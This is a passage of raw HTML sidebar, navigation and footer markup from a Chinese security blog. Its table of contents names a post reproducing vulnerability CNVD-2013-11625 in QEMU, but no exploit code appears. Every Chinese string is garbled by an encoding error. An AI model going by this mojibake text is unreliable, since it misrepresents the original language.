alt="å¾®ä¿¡æ”¯ä»˜"></a><div class="post-qr-code-desc">å¾®ä¿¡æ”¯ä»˜</div></li><li class="reward-item"><a href="/img/rewards/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/rewards/alipay.jpg" alt="æ”¯ä»˜å®"></a><div class="post-qr-code-desc">æ”¯ä»˜å®</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/3fd254db.html" title="IOTç¯å¢ƒæ­å»ºä¸å›ºä»¶åˆ†æ"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-130.jpg" onerror='onerror=null,src="/img/404/pic_404.png"' alt="cover of previous post"><div class="pagination-info"><div class="label">ä¸Šä¸€ç¯‡</div><div class="prev_info">IOTç¯å¢ƒæ­å»ºä¸å›ºä»¶åˆ†æ</div></div></a></div><div class="next-post pull-right"><a href="/posts/f0cbf9ee.html" title="IOTå›ºä»¶ä»¿çœŸä¸gdbserverè¿œç¨‹è°ƒè¯•"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-132.jpg" onerror='onerror=null,src="/img/404/pic_404.png"' alt="cover of next post"><div class="pagination-info"><div class="label">ä¸‹ä¸€ç¯‡</div><div class="next_info">IOTå›ºä»¶ä»¿çœŸä¸gdbserverè¿œç¨‹è°ƒè¯•</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>ç›¸å…³æ¨è</span></div><div class="relatedPosts-list"><div><a href="/posts/f0cbf9ee.html" title="IOTå›ºä»¶ä»¿çœŸä¸gdbserverè¿œç¨‹è°ƒè¯•"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-132.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2024-06-22</div><div class="title">IOTå›ºä»¶ä»¿çœŸä¸gdbserverè¿œç¨‹è°ƒè¯•</div></div></a></div><div><a href="/posts/3fd254db.html" title="IOTç¯å¢ƒæ­å»ºä¸å›ºä»¶åˆ†æ"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-130.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2024-06-22</div><div class="title">IOTç¯å¢ƒæ­å»ºä¸å›ºä»¶åˆ†æ</div></div></a></div><div><a href="/posts/bb411a4c.html" title="å¤šæ¶æ„ä¸äº¤å‰ç¼–è¯‘"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-133.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2024-06-21</div><div class="title">å¤šæ¶æ„ä¸äº¤å‰ç¼–è¯‘</div></div></a></div></div></div><hr><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i> <span>è¯„è®º</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="author_top is-center"><div class="card-info-avatar"><div class="avatar-img"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/blog/avatar.jpg" onerror='this.onerror=null,this.src="/img/404/loading_404.gif"' alt="avatar"></div><div class="author-status-box"><div class="author-status"><g-emoji class="g-emoji" alias="palm_tree" fallback-src="https://lskypro.acozycotage.net/LightPicture/2022/12/fe1dc0402e623096.jpg">ğŸ§¨</g-emoji><span>æ–°å¹´å¿«ä¹</span></div></div></div><div class="author-info__name">uf4te</div><div class="author-info__description">å¤©é“é…¬å‹¤</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">132</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">26</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/uf4te/uf4te.github.io"><i class="fab fa-github"></i><span>ç»™æˆ‘çš„ç½‘ç«™ä¸€ä¸ªstar ğŸ¤—</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:916884674@qq.com" target="_blank" title="mail æˆ‘çš„é‚®ç®±"><i class="fas fa-envelope"></i></a><a class="social-icon" href="/img/me/QRCode_QQ.png" target="_blank" title="åŠ æˆ‘ QQ"><i class="fa-brands fa-qq"></i></a><a class="social-icon" href="/img/me/QRCode_WeChat.png" target="_blank" title="åŠ æˆ‘å¾®ä¿¡"><i class="fa-brands fa-weixin"></i></a><a class="social-icon" href="https://afdian.net/a/uf4te" target="_blank" title="ä¸ºæˆ‘å‘ç”µ"><i class="fa-solid fa-plug-circle-bolt"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS è®¢é˜…"><i class="fa-solid fa-square-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>æ¬¢è¿æ¥åˆ°æˆ‘çš„å°ç«™</span></div><div class="announcement_content">æˆ‘æ˜¯ä¸€ä¸ªå–œæ¬¢äºŒè¿›åˆ¶çš„ CTFerï¼Œç›®å‰ä¸»è¦å­¦ä¹  PWN å’Œé€†å‘ï¼Œä¸€èµ·åŠ æ²¹ï¼Œäº’å‹‰ï¼</div><div style="margin-bottom:8px"></div><div class="item-headline"><i class="fa-solid fa-hourglass-half fa-shake"></i><span>è®¡æ—¶å°åŠ©æ‰‹</span></div><div id="timing"></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CNVD-2013-11625"><span class="toc-text">CNVD-2013-11625</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="toc-text">æ¼æ´ä¿¡æ¯</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E5%B7%A5%E5%85%B7"><span class="toc-text">å¤ç°å·¥å…·</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E6%BC%8F%E6%B4%9E"><span class="toc-text">å¤ç°æ¼æ´</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#QEMU-%E7%B3%BB%E7%BB%9F%E7%BA%A7%E5%A4%8D%E7%8E%B0"><span class="toc-text">QEMU ç³»ç»Ÿçº§å¤ç°</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">ç¯å¢ƒæ­å»º</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">æ¼æ´åˆ†æ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80%EF%BC%9A%E5%90%91-QEMU-%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E4%BC%A0-payload"><span class="toc-text">æ³•ä¸€ï¼šå‘ QEMU è™šæ‹Ÿæœºä¸Šä¼  payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%EF%BC%9A%E5%90%91-httpd-%E6%9C%8D%E5%8A%A1%E5%8F%91%E9%80%81-HTTP-%E6%8A%A5%E6%96%87"><span class="toc-text">æ³•äºŒï¼šå‘ httpd æœåŠ¡å‘é€ HTTP æŠ¥æ–‡</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#QEMU-%E7%94%A8%E6%88%B7%E7%BA%A7%E5%A4%8D%E7%8E%B0"><span class="toc-text">QEMU ç”¨æˆ·çº§å¤ç°</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-text">æ¼æ´åˆ†æ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%91%E7%94%A8%E6%88%B7%E6%80%81-QEMU-%E4%BC%A0%E9%80%92-payload-%E5%8F%82%E6%95%B0"><span class="toc-text">å‘ç”¨æˆ·æ€ QEMU ä¼ é€’ payload å‚æ•°</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/bb411a4c.html" title="å¤šæ¶æ„ä¸äº¤å‰ç¼–è¯‘"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-133.jpg" onerror='this.onerror=null,this.src="/img/404/pic_404.png"' alt="å¤šæ¶æ„ä¸äº¤å‰ç¼–è¯‘"></a><div class="content"><a class="title" href="/posts/bb411a4c.html" title="å¤šæ¶æ„ä¸äº¤å‰ç¼–è¯‘">å¤šæ¶æ„ä¸äº¤å‰ç¼–è¯‘</a><time datetime="2024-06-16T14:48:33.000Z" title="å‘è¡¨äº 2024-06-16 22:48:33">2024-06-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/f0cbf9ee.html" title="IOTå›ºä»¶ä»¿çœŸä¸gdbserverè¿œç¨‹è°ƒè¯•"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-132.jpg" onerror='this.onerror=null,this.src="/img/404/pic_404.png"' alt="IOTå›ºä»¶ä»¿çœŸä¸gdbserverè¿œç¨‹è°ƒè¯•"></a><div class="content"><a class="title" href="/posts/f0cbf9ee.html" title="IOTå›ºä»¶ä»¿çœŸä¸gdbserverè¿œç¨‹è°ƒè¯•">IOTå›ºä»¶ä»¿çœŸä¸gdbserverè¿œç¨‹è°ƒè¯•</a><time datetime="2024-06-16T14:16:49.000Z" title="å‘è¡¨äº 2024-06-16 22:16:49">2024-06-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/c2233a9.html" title="CNVD-2013-11625å¤ç°"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-131.jpg" onerror='this.onerror=null,this.src="/img/404/pic_404.png"' alt="CNVD-2013-11625å¤ç°"></a><div class="content"><a class="title" href="/posts/c2233a9.html" title="CNVD-2013-11625å¤ç°">CNVD-2013-11625å¤ç°</a><time datetime="2024-06-12T13:03:01.000Z" title="å‘è¡¨äº 2024-06-12 21:03:01">2024-06-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/3fd254db.html" title="IOTç¯å¢ƒæ­å»ºä¸å›ºä»¶åˆ†æ"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-130.jpg" onerror='this.onerror=null,this.src="/img/404/pic_404.png"' alt="IOTç¯å¢ƒæ­å»ºä¸å›ºä»¶åˆ†æ"></a><div class="content"><a class="title" href="/posts/3fd254db.html" title="IOTç¯å¢ƒæ­å»ºä¸å›ºä»¶åˆ†æ">IOTç¯å¢ƒæ­å»ºä¸å›ºä»¶åˆ†æ</a><time datetime="2024-06-07T03:47:53.000Z" title="å‘è¡¨äº 2024-06-07 11:47:53">2024-06-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/14f0dc5a.html" title="ã€plaidctf 2015ã€‘PlaidDB"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cover/cover-128.jpg" onerror='this.onerror=null,this.src="/img/404/pic_404.png"' alt="ã€plaidctf 2015ã€‘PlaidDB"></a><div class="content"><a class="title" href="/posts/14f0dc5a.html" title="ã€plaidctf 2015ã€‘PlaidDB">ã€plaidctf 2015ã€‘PlaidDB</a><time datetime="2024-05-31T09:22:41.000Z" title="å‘è¡¨äº 2024-05-31 17:22:41">2024-05-31</time></div></div></div></div><div class="card-widget" id="card-newest-comments"><div class="item-headline"><i class="fas fa-comment-dots"></i><span>æœ€æ–°è¯„è®º</span></div><div class="aside-list"><span>æ­£åœ¨åŠ è½½ä¸­...</span></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By uf4te</div><div class="framework-info"><span>æ¡†æ¶</span> <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>ä¸»é¢˜</span> <a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div id="running-time"></div><div class="icp"><a target="_blank" rel="noopener" href="https://beian.mps.gov.cn/#/query/webSearch?code=42011702000764"><img class="icp-icon" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/footer/gongan.png"><span>é„‚å…¬ç½‘å®‰å¤‡42011702000764</span></a> <span>|</span> <a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/"><img class="icp-icon" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/footer/icp.ico"><span>é„‚ICPå¤‡2023029632å·-1</span></a> <span>|</span> <a target="_blank" rel="noopener" href="https://icp.gov.moe/?keyword=20240052"><img class="icp-icon" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/footer/moe.png"><span>èŒICPå¤‡20240052å·</span></a></div><script id="LA-DATA-WIDGET" crossorigin="anonymous" charset="UTF-8" src="https://v6-widget.51.la/v6/3GoBenqrrrBby5er/quote.js?theme=#1690FF,#00C4B6,#CACACA,#00C4B6,#FFFFFF,#1690FF,14&f=12"></script><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&amp;logo=hexo" title="åšå®¢æ¡†æ¶ Hexo_v6.3.0"></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&amp;logo=bitdefender" title="ä¸»é¢˜ç‰ˆæœ¬ Butterfly_v4.7.0"></a><a class="github-badge" target="_blank" href="https://cloud.tencent.com/" style="margin-inline:5px"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Hosted-%E8%85%BE%E8%AE%AF%E4%BA%91-00bfff?style=flat&amp;logo=data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAEQUlEQVRIie1Wa0wcVRT+7t1ld3kIdGFbVAqIKSitMViQxjY+oVYbTfEVBB8xRovGCKbtj5L6z0pT07T+oSYNiUitsU3ahkokJUj/FJSKRrZsWRCYLGWBursIArKPucfMbJewhdmlxl+GL5lMMvOd8813zj33DlbxvwdTDBLRbfnsGKa7RqeQzhlEphlSwXrmup14xhj0KyUPu4l/cpEOnP6VvTzjYwkAsm6+ktbE0p9vPkwNR0v5sRWLYwWOv7oiHn3/DDs+62N5EWhSajy5Gl+j13fcz/siijIWXbj+R1H8zrf8BBGy9JxQlk8oe4jhvnWALIAeJ6GhC2i2cShZDDrqP/82lT6Tx22RhBESXu6yOuUE4x5hRxXRugOCOoZk0sK532SK3ydI4Zr3i26tnCGTmo5ZNfjOPPF5s41/YNQTLlcRNq/nkSqIJqvArnrVufPpXGEIEPe39aMIwAgt6n7EUrNqXGCMthGx5OrHBI6WRhYN4dglgYt2DslD8MtsWhDYkBsbAEyExBXhZbOxanRzjmIY5RidZQ4vFogViSrYsoHBOgFM+xhmA0hMioUSHLiVt2Scakfd5ZZXJ8nlExPQi0wlqsTJUOFLRG2GBZaY5SdweIaw92dC0wiHnAlgXs0+rk+mqS+ep8LKOt4SZg6LSl1ic5xom5orXjSjYUg36HE2Nx0FCaaw5+3jAi9dYpj0Ma1CSBXZ4mTjNv4xbi317sHxmpBoYYIJZ3LuRl9+Nto3ZuCVlESVc90XwBO9Dnzn+WshY9OIwM62oKiOAZW5Ap3PEmy7CF9uFchJVE1lfT3A3/jUKsrDPsc+5zXoO/sGWMc12mFzkFcWS4amfmKSjJ19pHC29EgUEIJOSzIZGwWxBqK4k0TnHEvHbconKP9CkHPHKWENW8iHrrvKlIS6jmv0+99ezVltnZyh7b0O8vgD1DgoU0zjQkJqG1v6sSG0j8kqjzXQ8Kkh+RFFUy21fd6Xo9wzTQbcazJo9QnFyfFoyUvHWYnhrcsMAcGQZCB8/xThyTTN/mLrWg5DsKlZ/dNM1dLfVFfnRV7BKVVnJ1R1cQgCzMagaGFq5BlX8lJwHYOxoJYasSnOdFVZeSNeP3pm5zUTHOkV+PCnoKjFRGgtiS6qoHWM4A9uBdKmZFxdEK6+c815A2M+xe/uoXFMy3JYoPL8YI/Avu7gQZAWS/hhOyHfHF3UOSfw0ZWg2xQjuV7IYL9g8RzXOP5499Coe7/Sh3uMMahMS8aDcSbEco7mQQMOW3VqsFFHqCsi5CRp91SpyIwf6HIBx+3AjXmVK9UVifcqc3nLkr26YsB58BvXdPniDYS7LRCelKjOokDau1F8dngzr4PWIdFwY+rxI2OePb1z3jzmWgsxac7+t2KckShMRVfNA1T7XDrvCb2I+iPQ7aZUr4D2fEVArA7z+WbmWY6x8COwilX85wDwD1dajk5dTj13AAAAAElFTkSuQmCC" title="æœ¬ç«™é‡‡ç”¨å¤šçº¿éƒ¨ç½²ï¼Œä¸»çº¿è·¯éƒ¨ç½²äºè…¾è®¯äº‘è½»é‡åº”ç”¨æœåŠ¡å™¨"></a><a class="github-badge" target="_blank" href="https://vercel.com/" style="margin-inline:5px"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Hosted-Vercel-black?style=flat&amp;logo=Vercel" title="æœ¬ç«™é‡‡ç”¨å¤šçº¿éƒ¨ç½²ï¼Œå¤‡ç”¨çº¿è·¯éƒ¨ç½²äº Vercel"></a><a class="github-badge" target="_blank" href="https://www.cloudflare.com/zh-cn/" style="margin-inline:5px"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Hosted-Cloudflare-F38020?style=flat&amp;logo=Cloudflare" title="æœ¬ç«™é‡‡ç”¨å¤šçº¿éƒ¨ç½²ï¼Œå¤‡ç”¨çº¿è·¯éƒ¨ç½²äº Cloudflare"></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&amp;logo=GitHub" title="æœ¬ç«™é¡¹ç›®ä¸»è¦ç”± Github æ‰˜ç®¡"></a><a class="github-badge" target="_blank" href="https://gitee.com/" style="margin-inline:5px"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Backup-Gitee-C71D23?style=flat&amp;logo=Gitee" title="æœ¬ç«™é¡¹ç›®ä¸»è¦ç”± Gitee å¤‡ä»½"></a><a class="github-badge" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-FF3030?style=flat&amp;logo=Claris" title="æœ¬ç«™é‡‡ç”¨çŸ¥è¯†å…±äº«ç½²å - éå•†ä¸šæ€§ä½¿ç”¨ - ç›¸åŒæ–¹å¼å…±äº« 4.0 å›½é™…è®¸å¯åè®®è¿›è¡Œè®¸å¯"></a><a class="github-badge" target="_blank" href="https://beian.mps.gov.cn/#/query/webSearch?code=42011702000764" style="margin-inline:5px"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/%E9%84%82%E5%85%AC%E7%BD%91%E5%AE%89%E5%A4%87-42011702000764-ee6363?style=flat&amp;logo=data:image/png;base64,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" title="æœ¬ç«™å·²é€šè¿‡å…¬å®‰å¤‡æ¡ˆ"></a><a class="github-badge" target="_blank" href="https://beian.miit.gov.cn/" style="margin-inline:5px"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" 